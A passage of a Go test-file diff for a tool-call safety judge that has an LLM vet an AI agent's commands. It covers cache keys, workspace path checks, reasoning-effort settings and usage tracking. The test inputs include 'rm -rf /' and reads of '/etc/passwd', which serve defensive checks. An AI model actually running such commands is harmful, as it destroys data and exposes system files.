@@ -45,6 +45,13 @@ func (m *mockLLMProvider) ChatCompletion(ctx context.Context, req llm.ChatReques
 	return response, err
 }
 
+// Call satisfies llm.Caller — the surface the ToolJudge now issues its
+// one-shot calls through. Delegates to ChatCompletion so the captured
+// request/counts stay shared with the legacy provider-style assertions.
+func (m *mockLLMProvider) Call(ctx context.Context, req llm.ChatRequest) (*llm.ChatResponse, error) {
+	return m.ChatCompletion(ctx, req)
+}
+
 func (m *mockLLMProvider) Name() string {
 	return "mock"
 }
@@ -58,20 +65,20 @@ func (m *mockLLMProvider) snapshot() []llm.ChatRequest {
 
 func TestJudgeCacheKey(t *testing.T) {
 	// Same tool name, input, and roots should produce same key
-	key1 := judgeCacheKey("bash", json.RawMessage(`{"command":"ls"}`), nil, "")
-	key2 := judgeCacheKey("bash", json.RawMessage(`{"command":"ls"}`), nil, "")
+	key1 := judgeCacheKey("bash", json.RawMessage(`{"command":"ls"}`), nil, "", "")
+	key2 := judgeCacheKey("bash", json.RawMessage(`{"command":"ls"}`), nil, "", "")
 	if key1 != key2 {
 		t.Errorf("expected same keys, got %q and %q", key1, key2)
 	}
 
 	// Different tool name should produce different key
-	key3 := judgeCacheKey("file_write", json.RawMessage(`{"command":"ls"}`), nil, "")
+	key3 := judgeCacheKey("file_write", json.RawMessage(`{"command":"ls"}`), nil, "", "")
 	if key1 == key3 {
 		t.Errorf("expected different keys for different tool names, got same key %q", key1)
 	}
 
 	// Different input should produce different key
-	key4 := judgeCacheKey("bash", json.RawMessage(`{"command":"rm -rf /"}`), nil, "")
+	key4 := judgeCacheKey("bash", json.RawMessage(`{"command":"rm -rf /"}`), nil, "", "")
 	if key1 == key4 {
 		t.Errorf("expected different keys for different inputs, got same key %q", key1)
 	}
@@ -79,11 +86,11 @@ func TestJudgeCacheKey(t *testing.T) {
 	// Different session roots must produce different keys: the judge prompt
 	// lists the roots, so the same tool+input is a different safety question
 	// in a session with another directory scope.
-	key5 := judgeCacheKey("bash", json.RawMessage(`{"command":"ls"}`), []string{"/ws/a"}, "")
+	key5 := judgeCacheKey("bash", json.RawMessage(`{"command":"ls"}`), []string{"/ws/a"}, "", "")
 	if key1 == key5 {
 		t.Errorf("expected different keys for different session roots, got same key %q", key1)
 	}
-	key6 := judgeCacheKey("bash", json.RawMessage(`{"command":"ls"}`), []string{"/ws/b"}, "")
+	key6 := judgeCacheKey("bash", json.RawMessage(`{"command":"ls"}`), []string{"/ws/b"}, "", "")
 	if key5 == key6 {
 		t.Errorf("expected different keys for different session roots, got same key %q", key5)
 	}
@@ -91,13 +98,29 @@ func TestJudgeCacheKey(t *testing.T) {
 	// A rendered static-analysis block must produce a different key: the
 	// block changes the judge prompt, so a verdict computed with a digest
 	// attached must not be reused for a digest-less evaluation.
-	key7 := judgeCacheKey("bash", json.RawMessage(`{"command":"ls"}`), nil, "## Static Analysis Report\n{x}")
+	key7 := judgeCacheKey("bash", json.RawMessage(`{"command":"ls"}`), nil, "## Static Analysis Report\n{x}", "")
 	if key1 == key7 {
 		t.Errorf("expected different keys with a static-analysis block, got same key %q", key1)
 	}
-	key8 := judgeCacheKey("bash", json.RawMessage(`{"command":"ls"}`), nil, "## Static Analysis Report\n{y}")
+	key8 := judgeCacheKey("bash", json.RawMessage(`{"command":"ls"}`), nil, "## Static Analysis Report\n{y}", "")
 	if key7 == key8 {
 		t.Errorf("expected different keys for different analysis blocks, got same key %q", key7)
+	}
+
+	// The serving model must produce a different key: the judge rides the
+	// caller's ACTIVE model, so the same tool+input evaluated by another
+	// model is a different safety question and a verdict must not be reused
+	// across models.
+	key9 := judgeCacheKey("bash", json.RawMessage(`{"command":"ls"}`), nil, "", "model-a")
+	if key1 == key9 {
+		t.Errorf("expected different keys for different models, got same key %q", key1)
+	}
+	key10 := judgeCacheKey("bash", json.RawMessage(`{"command":"ls"}`), nil, "", "model-b")
+	if key9 == key10 {
+		t.Errorf("expected different keys for different models, got same key %q", key9)
+	}
+	if judgeCacheKey("bash", json.RawMessage(`{"command":"ls"}`), nil, "", "model-a") != key9 {
+		t.Error("expected the same model to produce the same key")
 	}
 }
 
@@ -107,7 +130,7 @@ func TestJudge_CacheHit(t *testing.T) {
 			Message: llm.Message{Content: "VERDICT: ALLOW\nREASON: Safe operation"},
 		},
 	}
-	judge := NewToolJudge(mockProvider, "test-model", 0, nil)
+	judge := NewToolJudge(mockProvider, nil, 0, nil)
 
 	ctx := context.Background()
 	input := json.RawMessage(`{"command":"ls"}`)
@@ -149,7 +172,7 @@ func TestJudge_CacheMiss(t *testing.T) {
 			Message: llm.Message{Content: "VERDICT: CONFIRM\nREASON: Potentially dangerous"},
 		},
 	}
-	judge := NewToolJudge(mockProvider, "test-model", 0, nil)
+	judge := NewToolJudge(mockProvider, nil, 0, nil)
 
 	ctx := context.Background()
 
@@ -182,7 +205,7 @@ func TestJudge_AllowVerdict(t *testing.T) {
 			Message: llm.Message{Content: "VERDICT: ALLOW\nREASON: Safe file listing command"},
 		},
 	}
-	judge := NewToolJudge(mockProvider, "test-model", 0, nil)
+	judge := NewToolJudge(mockProvider, nil, 0, nil)
 
 	ctx := context.Background()
 	verdict, reason, err := judge.Judge(ctx, "bash", json.RawMessage(`{"command":"ls -la"}`), "list directory contents")
@@ -203,7 +226,7 @@ func TestJudge_ConfirmVerdict(t *testing.T) {
 			Message: llm.Message{Content: "VERDICT: CONFIRM\nREASON: Destructive command detected"},
 		},
 	}
-	judge := NewToolJudge(mockProvider, "test-model", 0, nil)
+	judge := NewToolJudge(mockProvider, nil, 0, nil)
 
 	ctx := context.Background()
 	verdict, reason, err := judge.Judge(ctx, "bash", json.RawMessage(`{"command":"rm -rf /"}`), "delete everything")
@@ -222,7 +245,7 @@ func TestJudge_LLMError_FallsBackToConfirm(t *testing.T) {
 	mockProvider := &mockLLMProvider{
 		err: errors.New("LLM connection error"),
 	}
-	judge := NewToolJudge(mockProvider, "test-model", 0, nil)
+	judge := NewToolJudge(mockProvider, nil, 0, nil)
 
 	ctx := context.Background()
 	verdict, reason, err := judge.Judge(ctx, "bash", json.RawMessage(`{"command":"ls"}`), "list files")
@@ -244,7 +267,7 @@ func TestJudge_TaskContextFromCtx(t *testing.T) {
 			Message: llm.Message{Content: "VERDICT: ALLOW\nREASON: Safe"},
 		},
 	}
-	judge := NewToolJudge(mockProvider, "test-model", 0, nil)
+	judge := NewToolJudge(mockProvider, nil, 0, nil)
 
 	// Create context with task context
 	ctx := WithTaskContext(context.Background(), "task from context")
@@ -279,7 +302,7 @@ func TestJudge_TaskContextParameter_TakesPrecedence(t *testing.T) {
 			Message: llm.Message{Content: "VERDICT: ALLOW\nREASON: Safe"},
 		},
 	}
-	judge := NewToolJudge(mockProvider, "test-model", 0, nil)
+	judge := NewToolJudge(mockProvider, nil, 0, nil)
 
 	// Create context with task context
 	ctx := WithTaskContext(context.Background(), "task from context")
@@ -323,7 +346,7 @@ func TestJudge_FullInputPassedToLLM(t *testing.T) {
 			Message: llm.Message{Content: "VERDICT: ALLOW\nREASON: Safe"},
 		},
 	}
-	judge := NewToolJudge(mockProvider, "test-model", 0, nil)
+	judge := NewToolJudge(mockProvider, nil, 0, nil)
 
 	// Create a very long input (3000+ bytes)
 	longInput := make([]byte, 3000)
@@ -457,7 +480,7 @@ func TestJudge_WorkspacePreCheck_AllowsInternalPaths(t *testing.T) {
 			Message: llm.Message{Content: "VERDICT: CONFIRM\nREASON: Should not reach here"},
 		},
 	}
-	judge := NewToolJudge(mockProvider, "test-model", 0, nil)
+	judge := NewToolJudge(mockProvider, nil, 0, nil)
 
 	ctx := WithWorkspacePath(context.Background(), "/tmp/test-workspace")
 	input := json.RawMessage(`{"path":"/tmp/test-workspace/src/main.go"}`)
@@ -483,7 +506,7 @@ func TestJudge_WorkspacePreCheck_DeniesExternalPaths(t *testing.T) {
 			Message: llm.Message{Content: "VERDICT: CONFIRM\nREASON: External path"},
 		},
 	}
-	judge := NewToolJudge(mockProvider, "test-model", 0, nil)
+	judge := NewToolJudge(mockProvider, nil, 0, nil)
 
 	ctx := WithWorkspacePath(context.Background(), "/tmp/test-workspace")
 	input := json.RawMessage(`{"path":"/etc/passwd"}`)
@@ -506,7 +529,7 @@ func TestJudge_WorkspacePreCheck_MixedPaths(t *testing.T) {
 			Message: llm.Message{Content: "VERDICT: CONFIRM\nREASON: Mixed paths"},
 		},
 	}
-	judge := NewToolJudge(mockProvider, "test-model", 0, nil)
+	judge := NewToolJudge(mockProvider, nil, 0, nil)
 
 	ctx := WithWorkspacePath(context.Background(), "/tmp/test-workspace")
 	input := json.RawMessage(`{"src":"/tmp/test-workspace/file.go","dest":"/etc/somefile"}`)
@@ -529,7 +552,7 @@ func TestJudge_WorkspacePreCheck_NoWorkspace(t *testing.T) {
 			Message: llm.Message{Content: "VERDICT: ALLOW\nREASON: From LLM"},
 		},
 	}
-	judge := NewToolJudge(mockProvider, "test-model", 0, nil)
+	judge := NewToolJudge(mockProvider, nil, 0, nil)
 
 	ctx := context.Background() // no workspace path
 	input := json.RawMessage(`{"path":"/tmp/test-workspace/file.go"}`)
@@ -552,7 +575,7 @@ func TestJudge_WorkspacePreCheck_NoPaths(t *testing.T) {
 			Message: llm.Message{Content: "VERDICT: ALLOW\nREASON: From LLM"},
 		},
 	}
-	judge := NewToolJudge(mockProvider, "test-model", 0, nil)
+	judge := NewToolJudge(mockProvider, nil, 0, nil)
 
 	ctx := WithWorkspacePath(context.Background(), "/tmp/test-workspace")
 	input := json.RawMessage(`{"query":"SELECT * FROM users"}`)
@@ -575,7 +598,7 @@ func TestJudge_WorkspacePreCheck_BashCommand(t *testing.T) {
 			Message: llm.Message{Content: "VERDICT: CONFIRM\nREASON: Should not reach here"},
 		},
 	}
-	judge := NewToolJudge(mockProvider, "test-model", 0, nil)
+	judge := NewToolJudge(mockProvider, nil, 0, nil)
 
 	ctx := WithWorkspacePath(context.Background(), "/tmp/test-workspace")
 	input := json.RawMessage(`{"command":"cat /tmp/test-workspace/src/main.go | grep func"}`)
@@ -603,7 +626,7 @@ func TestJudge_ShellTools_SkipWorkspaceFastPath(t *testing.T) {
 					Message: llm.Message{Content: "VERDICT: CONFIRM\nREASON: Shell command needs review"},
 				},
 			}
-			judge := NewToolJudge(mockProvider, "test-model", 0, nil)
+			judge := NewToolJudge(mockProvider, nil, 0, nil)
 
 			// Both workspace and temp dir set; command references only
 			// workspace-internal paths but could still pipe remote code.
@@ -631,7 +654,7 @@ func TestJudge_WorkspacePreCheck_RelativePaths(t *testing.T) {
 			Message: llm.Message{Content: "VERDICT: ALLOW\nREASON: From LLM"},
 		},
 	}
-	judge := NewToolJudge(mockProvider, "test-model", 0, nil)
+	judge := NewToolJudge(mockProvider, nil, 0, nil)
 
 	ctx := WithWorkspacePath(context.Background(), "/tmp/test-workspace")
 	input := json.RawMessage(`{"path":"src/main.go"}`)
@@ -1219,7 +1242,7 @@ func TestJudge_AllowedRootsPreCheck_AllowsInternalPaths(t *testing.T) {
 			Message: llm.Message{Content: "VERDICT: CONFIRM\nREASON: Should not reach here"},
 		},
 	}
-	judge := NewToolJudge(mockProvider, "test-model", 0, nil)
+	judge := NewToolJudge(mockProvider, nil, 0, nil)
 
 	// Workspace is a different, unrelated directory; the path targets an
 	// allowed root (auxiliary working directory).
@@ -1250,7 +1273,7 @@ func TestJudge_AllowedRootsPreCheck_DeniesExternalPaths(t *testing.T) {
 			Message: llm.Message{Content: "VERDICT: CONFIRM\nREASON: External path"},
 		},
 	}
-	judge := NewToolJudge(mockProvider, "test-model", 0, nil)
+	judge := NewToolJudge(mockProvider, nil, 0, nil)
 
 	ctx := WithWorkspacePath(context.Background(), "/home/user/project")
 	ctx = WithAllowedRoots(ctx, []string{"/aux/work"})
@@ -1281,7 +1304,7 @@ func TestJudge_InternalTools_ReturnsAllowImmediately(t *testing.T) {
 					Message: llm.Message{Content: "VERDICT: CONFIRM\nREASON: Should not reach here"},
 				},
 			}
-			judge := NewToolJudge(mockProvider, "test-model", 0, nil)
+			judge := NewToolJudge(mockProvider, nil, 0, nil)
 			// Configure internal tool recognition for the test
 			internalSet := map[string]struct{}{"ask_user": {}, "finish": {}, "list_step_outputs": {}, "read_final_result": {}, "read_skill_resource": {}, "read_step_output": {}, "search_facts": {}, "semantic_search": {}, "update_checklist": {}, "declare_step_complete": {}, "store_fact": {}, "tool_result_read": {}, "delegate": {}, "cancel_delegation": {}, "declare_plan": {}, "reflect": {}, "batch": {}}
 			judge.SetIsInternalFn(func(name string) bool { _, ok := internalSet[name]; return ok })
@@ -1314,7 +1337,7 @@ func TestJudge_NonInternalTools_CallsLLM(t *testing.T) {
 			Message: llm.Message{Content: "VERDICT: ALLOW\nREASON: Safe operation"},
 		},
 	}
-	judge := NewToolJudge(mockProvider, "test-model", 0, nil)
+	judge := NewToolJudge(mockProvider, nil, 0, nil)
 
 	ctx := context.Background()
 	input := json.RawMessage(`{"command":"ls"}`)
@@ -1342,7 +1365,7 @@ func TestJudge_TempDirPreCheck_AllowsInternalPaths(t *testing.T) {
 			Message: llm.Message{Content: "VERDICT: CONFIRM\nREASON: Should not reach here"},
 		},
 	}
-	judge := NewToolJudge(mockProvider, "test-model", 0, nil)
+	judge := NewToolJudge(mockProvider, nil, 0, nil)
 
 	ctx := WithTempDir(context.Background(), "/tmp/session-temp")
 	input := json.RawMessage(`{"path":"/tmp/session-temp/cache/data.json"}`)
@@ -1368,7 +1391,7 @@ func TestJudge_TempDirPreCheck_DeniesExternalPaths(t *testing.T) {
 			Message: llm.Message{Content: "VERDICT: CONFIRM\nREASON: External path"},
 		},
 	}
-	judge := NewToolJudge(mockProvider, "test-model", 0, nil)
+	judge := NewToolJudge(mockProvider, nil, 0, nil)
 
 	ctx := WithTempDir(context.Background(), "/tmp/session-temp")
 	input := json.RawMessage(`{"path":"/etc/passwd"}`)
@@ -1391,7 +1414,7 @@ func TestJudge_TempDirPreCheck_MixedPaths(t *testing.T) {
 			Message: llm.Message{Content: "VERDICT: CONFIRM\nREASON: Mixed paths"},
 		},
 	}
-	judge := NewToolJudge(mockProvider, "test-model", 0, nil)
+	judge := NewToolJudge(mockProvider, nil, 0, nil)
 
 	ctx := WithTempDir(context.Background(), "/tmp/session-temp")
 	input := json.RawMessage(`{"src":"/tmp/session-temp/file.txt","dest":"/tmp/other/file.txt"}`)
@@ -1414,7 +1437,7 @@ func TestJudge_TempDirPreCheck_NoTempDir(t *testing.T) {
 			Message: llm.Message{Content: "VERDICT: ALLOW\nREASON: From LLM"},
 		},
 	}
-	judge := NewToolJudge(mockProvider, "test-model", 0, nil)
+	judge := NewToolJudge(mockProvider, nil, 0, nil)
 
 	ctx := context.Background() // no temp dir
 	input := json.RawMessage(`{"path":"/tmp/session-temp/file.txt"}`)
@@ -1437,7 +1460,7 @@ func TestJudge_TempDirPreCheck_TakesPrecedenceOverWorkspace(t *testing.T) {
 			Message: llm.Message{Content: "VERDICT: CONFIRM\nREASON: Should not reach here"},
 		},
 	}
-	judge := NewToolJudge(mockProvider, "test-model", 0, nil)
+	judge := NewToolJudge(mockProvider, nil, 0, nil)
 
 	// Both temp dir and workspace are set, but path is only in temp dir
 	ctx := WithTempDir(context.Background(), "/tmp/session-temp")
@@ -1467,7 +1490,7 @@ func TestJudgeEvaluate_WithEnvInfo(t *testing.T) {
 			Message: llm.Message{Content: "VERDICT: ALLOW\nREASON: Safe operation"},
 		},
 	}
-	judge := NewToolJudge(mockProvider, "test-model", 0, nil)
+	judge := NewToolJudge(mockProvider, nil, 0, nil)
 
 	info := &EnvInfo{
 		OS:   "macOS 15.4 (Darwin 24.4.0)",
@@ -1510,7 +1533,7 @@ func TestJudge_WithoutEnvInfo(t *testing.T) {
 			Message: llm.Message{Content: "VERDICT: ALLOW\nREASON: Safe operation"},
 		},
 	}
-	judge := NewToolJudge(mockProvider, "test-model", 0, nil)
+	judge := NewToolJudge(mockProvider, nil, 0, nil)
 
 	// No env info, no workspace — falls through to LLM.
 	ctx := context.Background()
@@ -1638,7 +1661,7 @@ func TestJudgeEvaluate_WithSessionRootsBlock(t *testing.T) {
 			Message: llm.Message{Content: "VERDICT: ALLOW\nREASON: Safe operation"},
 		},
 	}
-	judge := NewToolJudge(mockProvider, "test-model", 0, nil)
+	judge := NewToolJudge(mockProvider, nil, 0, nil)
 
 	ctx := WithWorkspacePath(context.Background(), "/home/user/project")
 	ctx = WithAllowedRoots(ctx, []string{"/aux/repo", "/tmp"})
@@ -1682,7 +1705,7 @@ func TestJudge_WithoutSessionRoots(t *testing.T) {
 			Message: llm.Message{Content: "VERDICT: ALLOW\nREASON: Safe operation"},
 		},
 	}
-	judge := NewToolJudge(mockProvider, "test-model", 0, nil)
+	judge := NewToolJudge(mockProvider, nil, 0, nil)
 
 	ctx := context.Background()
 	input := json.RawMessage(`{"command":"ls"}`)
@@ -1711,7 +1734,7 @@ func TestJudgeEvaluate_WithShellAnalysisBlock(t *testing.T) {
 			Message: llm.Message{Content: "VERDICT: ALLOW\nREASON: Safe operation"},
 		},
 	}
-	judge := NewToolJudge(mockProvider, "test-model", 0, nil)
+	judge := NewToolJudge(mockProvider, nil, 0, nil)
 
 	ctx := WithWorkspacePath(context.Background(), "/home/user/project")
 	ctx = WithAllowedRoots(ctx, []string{"/aux/repo"})
@@ -1794,7 +1817,7 @@ func TestJudge_WithoutShellAnalysis(t *testing.T) {
 			mockProvider := &mockLLMProvider{
 				response: &llm.ChatResponse{Message: llm.Message{Content: "VERDICT: ALLOW\nREASON: Safe operation"}},
 			}
-			judge := NewToolJudge(mockProvider, "test-model", 0, nil)
+			judge := NewToolJudge(mockProvider, nil, 0, nil)
 			// A non-shell tool with no absolute paths in its input would be
 			// fast-path allowed; embed a path so the call always reaches the
 			// LLM and the prompt is observable.
@@ -1824,7 +1847,7 @@ func TestJudge_CacheSeparatedByAnalysisBlock(t *testing.T) {
 	mockProvider := &mockLLMProvider{
 		response: &llm.ChatResponse{Message: llm.Message{Content: "VERDICT: ALLOW\nREASON: Safe operation"}},
 	}
-	judge := NewToolJudge(mockProvider, "test-model", 0, nil)
+	judge := NewToolJudge(mockProvider, nil, 0, nil)
 
 	input := json.RawMessage(`{"command":"ls"}`)
 	if _, _, err := judge.Judge(context.Background(), "bash_exec", input, "list files"); err != nil {
@@ -1856,7 +1879,7 @@ func TestJudge_CacheSeparatedBySessionRoots(t *testing.T) {
 			Message: llm.Message{Content: "VERDICT: ALLOW\nREASON: Safe operation"},
 		},
 	}
-	judge := NewToolJudge(mockProvider, "test-model", 0, nil)
+	judge := NewToolJudge(mockProvider, nil, 0, nil)
 
 	input := json.RawMessage(`{"command":"cat /aux/notes.md"}`)
 	ctxA := WithWorkspacePath(context.Background(), "/ws/a")
@@ -1882,7 +1905,7 @@ func TestJudge_CacheEviction(t *testing.T) {
 			Message: llm.Message{Content: "VERDICT: ALLOW\nREASON: Safe"},
 		},
 	}
-	judge := NewToolJudge(mockProvider, "test-model", 3, nil) // tiny cache
+	judge := NewToolJudge(mockProvider, nil, 3, nil) // tiny cache
 
 	ctx := context.Background()
 
@@ -1927,7 +1950,7 @@ func TestJudge_InternalToolSkipsAllChecks(t *testing.T) {
 			Message: llm.Message{Content: "VERDICT: CONFIRM\nREASON: Should not reach here"},
 		},
 	}
-	judge := NewToolJudge(mockProvider, "test-model", 0, nil)
+	judge := NewToolJudge(mockProvider, nil, 0, nil)
 	judge.SetIsInternalFn(func(name string) bool { return name == "internal_tool" })
 
 	// Set up both workspace and temp dir; internal tool should still bypass.
@@ -1952,7 +1975,7 @@ func TestJudge_InternalToolSkipsAllChecks(t *testing.T) {
 
 // TestSetSystemPrompt verifies SetSystemPrompt with custom and empty values.
 func TestSetSystemPrompt(t *testing.T) {
-	judge := NewToolJudge(nil, "test", 0, nil)
+	judge := NewToolJudge(nil, nil, 0, nil)
 
 	// Set custom prompt.
 	judge.SetSystemPrompt("Custom system prompt")
@@ -1973,48 +1996,17 @@ func TestSetSystemPrompt(t *testing.T) {
 
 // TestNewToolJudgeFromConfig tests all configuration paths.
 func TestNewToolJudgeFromConfig(t *testing.T) {
-	// Nil provider → nil judge.
+	// Nil caller → nil judge.
 	j := NewToolJudgeFromConfig(JudgeConfig{}, nil)
 	if j != nil {
-		t.Error("expected nil judge when provider is nil")
+		t.Error("expected nil judge when caller is nil")
 	}
 
-	// No model, no default model → nil judge.
 	mockProvider := &mockLLMProvider{}
-	j = NewToolJudgeFromConfig(JudgeConfig{Provider: mockProvider}, nil)
-	if j != nil {
-		t.Error("expected nil judge when no model is configured")
-	}
-
-	// Model from DefaultModel fallback.
-	j = NewToolJudgeFromConfig(JudgeConfig{
-		Provider:     mockProvider,
-		DefaultModel: "fallback-model",
-	}, nil)
-	if j == nil {
-		t.Fatal("expected non-nil judge when DefaultModel is set")
-	}
-	if j.model != "fallback-model" {
-		t.Errorf("expected model 'fallback-model', got %q", j.model)
-	}
-
-	// Explicit model takes precedence.
-	j = NewToolJudgeFromConfig(JudgeConfig{
-		Provider:     mockProvider,
-		Model:        "explicit-model",
-		DefaultModel: "fallback-model",
-	}, nil)
-	if j == nil {
-		t.Fatal("expected non-nil judge")
-	}
-	if j.model != "explicit-model" {
-		t.Errorf("expected model 'explicit-model', got %q", j.model)
-	}
 
 	// Custom SystemPrompt.
 	j = NewToolJudgeFromConfig(JudgeConfig{
-		Provider:     mockProvider,
-		Model:        "test",
+		Caller:       mockProvider,
 		SystemPrompt: "My custom prompt",
 	}, nil)
 	if j == nil {
@@ -2027,8 +2019,7 @@ func TestNewToolJudgeFromConfig(t *testing.T) {
 	// Custom IsInternalFn.
 	customFn := func(name string) bool { return name == "special" }
 	j = NewToolJudgeFromConfig(JudgeConfig{
-		Provider:     mockProvider,
-		Model:        "test",
+		Caller:       mockProvider,
 		IsInternalFn: customFn,
 	}, nil)
 	if j == nil {
@@ -2040,8 +2031,7 @@ func TestNewToolJudgeFromConfig(t *testing.T) {
 
 	// MaxCacheSize propagation.
 	j = NewToolJudgeFromConfig(JudgeConfig{
-		Provider:     mockProvider,
-		Model:        "test",
+		Caller:       mockProvider,
 		MaxCacheSize: 500,
 	}, nil)
 	if j == nil {
@@ -2049,6 +2039,35 @@ func TestNewToolJudgeFromConfig(t *testing.T) {
 	}
 	if j.maxCacheSize != 500 {
 		t.Errorf("expected maxCacheSize 500, got %d", j.maxCacheSize)
+	}
+
+	// The judge carries no model of its own: the request stays model-less so
+	// the caller routes it to its active model by construction.
+	if j.routeCaller != mockProvider || j.caller != mockProvider {
+		t.Errorf("expected the config caller to be stored as both routeCaller and caller, got %v/%v", j.routeCaller, j.caller)
+	}
+
+	// UsageTracker wires the TrackingCaller passage.
+	tracker := llm.NewUsageTracker()
+	j = NewToolJudgeFromConfig(JudgeConfig{
+		Caller:       mockProvider,
+		UsageTracker: tracker,
+		MaxCacheSize: 8,
+	}, nil)
+	if j == nil {
+		t.Fatal("expected non-nil judge")
+	}
+	if j.routeCaller != mockProvider {
+		t.Error("routeCaller must stay the raw config caller (probe surface)")
+	}
+	if j.caller == mockProvider {
+		t.Error("caller must be a TrackingCaller wrap when a tracker is supplied")
+	}
+
+	// No tracker → the caller passes through unwrapped.
+	j = NewToolJudgeFromConfig(JudgeConfig{Caller: mockProvider}, nil)
+	if j.caller != mockProvider {
+		t.Error("expected the raw caller when no tracker is supplied")
 	}
 }
 
@@ -2535,4 +2554,193 @@ func TestJudgeReasonCode_Vocabulary(t *testing.T) {
 			t.Errorf("JudgeReasonCode literal = %q, want %q — published codes are never renamed", string(code), want)
 		}
 	}
+}
+
+// modelAwareCaller is a test caller that additionally exposes the optional
+// ActiveModel capability *llm.Router carries, so the judge's model-aware
+// behavior (reasoning tier resolution) can be exercised without a real
+// router.
+type modelAwareCaller struct {
+	*mockLLMProvider
+	activeModel string
+}
+
+func (m *modelAwareCaller) ActiveModel() string { return m.activeModel }
+
+// TestJudgeReasoningTierOff pins the judges' reasoning-off policy: when the
+// caller exposes its active model (a Router does), every judge request
+// carries the family's native disable spelling resolved through
+// llm.ReasoningForCall; when it does not, no reasoning field is sent.
+func TestJudgeReasoningTierOff(t *testing.T) {
+	cases := []struct {
+		name        string
+		activeModel string
+		want        string
+	}{
+		// Qwen 3.8+: the binary disable spelling.
+		{"qwen38", "provA/qwen3.8-max", "Off"},
+		// Catalog-family alias (name-based detection cannot resolve it): the
+		// built-in catalog must supply the qwen family.
+		{"bonsai alias", "provA/Bonsai 2 27B", "Off"},
+		// OpenAI reasoning models have no disable spelling — degrade to the
+		// cheapest effort.
+		{"openai degrade", "provA/gpt-5.6", "minimal"},
+		// Anthropic: the binary disable spelling.
+		{"anthropic", "provA/claude-sonnet-4-5", "Off"},
+		// GLM 5.2+: the "none" disable spelling.
+		{"glm52", "provA/glm-5.2", "none"},
+		// Unknown family: fail closed to no field.
+		{"unknown family", "provA/mistral-large", ""},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			provider := &modelAwareCaller{
+				mockLLMProvider: &mockLLMProvider{response: strictResponse("VERDICT: ALLOW\nREASON: safe")},
+				activeModel:     tc.activeModel,
+			}
+			judge := NewToolJudge(provider, nil, 0, nil)
+			ctx := WithWorkspacePath(context.Background(), t.TempDir())
+			if _, _, err := judge.Judge(ctx, "bash_exec", json.RawMessage(`{"command":"echo hi"}`), "task"); err != nil {
+				t.Fatalf("Judge returned error: %v", err)
+			}
+			got := provider.snapshot()[0].ReasoningEffort
+			if got != tc.want {
+				t.Fatalf("ReasoningEffort = %q, want %q", got, tc.want)
+			}
+		})
+	}
+
+	t.Run("caller without ActiveModel sends no reasoning field", func(t *testing.T) {
+		provider := &mockLLMProvider{response: strictResponse("VERDICT: ALLOW\nREASON: safe")}
+		judge := NewToolJudge(provider, nil, 0, nil)
+		ctx := WithWorkspacePath(context.Background(), t.TempDir())
+		if _, _, err := judge.Judge(ctx, "bash_exec", json.RawMessage(`{"command":"echo hi"}`), "task"); err != nil {
+			t.Fatalf("Judge returned error: %v", err)
+		}
+		if got := provider.snapshot()[0].ReasoningEffort; got != "" {
+			t.Fatalf("ReasoningEffort = %q, want empty (no field)", got)
+		}
+	})
+
+	t.Run("strict and step-limit judges carry the same tier", func(t *testing.T) {
+		provider := &modelAwareCaller{
+			mockLLMProvider: &mockLLMProvider{response: strictResponse("VERDICT: DENY\nREASON: x")},
+			activeModel:     "provA/qwen3.8-max",
+		}
+		judge := NewToolJudge(provider, nil, 0, nil)
+		if _, _, err := judge.JudgeStrict(context.Background(), StrictJudgeRequest{
+			ToolName: "bash_exec",
+			Input:    json.RawMessage(`{"command":"echo hi"}`),
+		}); err != nil {
+			t.Fatalf("JudgeStrict returned error: %v", err)
+		}
+		if got := provider.snapshot()[0].ReasoningEffort; got != "Off" {
+			t.Fatalf("strict judge ReasoningEffort = %q, want Off", got)
+		}
+		if _, _, err := judge.JudgeStepLimit(context.Background(), StepLimitJudgeRequest{CurrentStep: 1, MaxSteps: 1}); err != nil {
+			t.Fatalf("JudgeStepLimit returned error: %v", err)
+		}
+		if got := provider.snapshot()[1].ReasoningEffort; got != "Off" {
+			t.Fatalf("step-limit judge ReasoningEffort = %q, want Off", got)
+		}
+	})
+}
+
+// TestJudgeDelegatesSamplingToRouter pins that the advisory and step-limit
+// judges set NO temperature of their own and declare the routing purpose:
+// the caller (the Router) resolves the deterministic sampling profile from
+// the model catalog — family-safe floors included — and strips sampling for
+// models that authoritatively cannot take the parameter. Every judge verdict
+// must be reproducible on identical input, which is exactly what the
+// routing-purpose class guarantees.
+func TestJudgeDelegatesSamplingToRouter(t *testing.T) {
+	t.Run("advisory judge", func(t *testing.T) {
+		provider := &mockLLMProvider{response: strictResponse("VERDICT: ALLOW\nREASON: safe read")}
+		judge := NewToolJudge(provider, nil, 0, nil)
+		ctx := WithWorkspacePath(context.Background(), t.TempDir())
+		if _, _, err := judge.Judge(ctx, "bash_exec", json.RawMessage(`{"command":"echo hi"}`), "run tests"); err != nil {
+			t.Fatalf("Judge returned error: %v", err)
+		}
+		requests := provider.snapshot()
+		if len(requests) != 1 {
+			t.Fatalf("expected one LLM call, got %d", len(requests))
+		}
+		if requests[0].Temperature != nil {
+			t.Fatalf("advisory judge temperature = %v, want nil (the router injects the catalog profile)", *requests[0].Temperature)
+		}
+		if requests[0].CallPurpose != llm.CallPurposeRouting {
+			t.Fatalf("advisory judge call purpose = %q, want routing", requests[0].CallPurpose)
+		}
+	})
+
+	t.Run("step-limit judge", func(t *testing.T) {
+		provider := &mockLLMProvider{response: loopJudgeResponse("VERDICT: DENY\nREASON: x")}
+		judge := NewToolJudge(provider, nil, 0, nil)
+		_, _, _ = judge.JudgeStepLimit(context.Background(), StepLimitJudgeRequest{CurrentStep: 3, MaxSteps: 3})
+		requests := provider.snapshot()
+		if len(requests) != 1 {
+			t.Fatalf("expected one LLM call, got %d", len(requests))
+		}
+		if requests[0].Temperature != nil {
+			t.Fatalf("step-limit judge temperature = %v, want nil (the router injects the catalog profile)", *requests[0].Temperature)
+		}
+		if requests[0].CallPurpose != llm.CallPurposeRouting {
+			t.Fatalf("step-limit judge call purpose = %q, want routing", requests[0].CallPurpose)
+		}
+	})
+}
+
+// TestJudgeTokenAccountingViaTrackingCaller pins the judges' token-accounting
+// contract: when constructed with a usage tracker, every judge call passes
+// through a TrackingCaller and records the response usage into it — judge
+// calls are real session consumption.
+func TestJudgeTokenAccountingViaTrackingCaller(t *testing.T) {
+	tracked := &llm.TokenUsage{InputTokens: 42, OutputTokens: 7}
+	newTrackedMock := func(response string) *mockLLMProvider {
+		return &mockLLMProvider{response: &llm.ChatResponse{
+			Message: llm.Message{Content: response},
+			Usage:   *tracked,
+			Model:   "test-model",
+		}}
+	}
+
+	t.Run("advisory judge", func(t *testing.T) {
